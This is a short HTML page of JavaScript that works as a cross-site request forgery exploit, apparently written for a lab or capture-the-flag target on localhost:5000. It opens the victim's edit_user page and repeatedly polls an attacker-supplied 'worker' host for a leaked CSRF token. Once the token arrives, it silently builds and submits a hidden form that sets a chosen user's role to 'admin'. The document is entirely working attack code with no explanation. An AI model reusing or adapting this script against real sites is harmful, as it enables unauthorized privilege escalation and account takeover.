<!doctype html>
<meta charset="utf-8">
<body>
<script>
const params = new URLSearchParams(location.search);
const userId = params.get('uid');
const worker = params.get('w');
const sid = params.get('sid');

function openVictim() {
  window.open('http://localhost:5000/edit_user', '_blank');
}

async function poll() {
  for (;;) {
    const r = await fetch(worker + '/token?id=' + encodeURIComponent(sid), {
      cache: 'no-store',
    });
    const data = await r.json();

    if (data.token && data.token.length >= 91) {
      const f = document.createElement('form');
      f.method = 'POST';
      f.action = 'http://localhost:5000/edit_user';

      const fields = {
        user_id: userId,
        username: '',
        password: '',
        role: 'admin',
        csrf_token: data.token,
      };

      for (const [k, v] of Object.entries(fields)) {
        const i = document.createElement('input');
        i.type = 'hidden';
        i.name = k;
        i.value = v;
        f.appendChild(i);
      }

      document.body.appendChild(f);
      f.submit();
      return;
    }

    await new Promise(r => setTimeout(r, 30));
  }
}

openVictim();
poll();
</script>
</body>
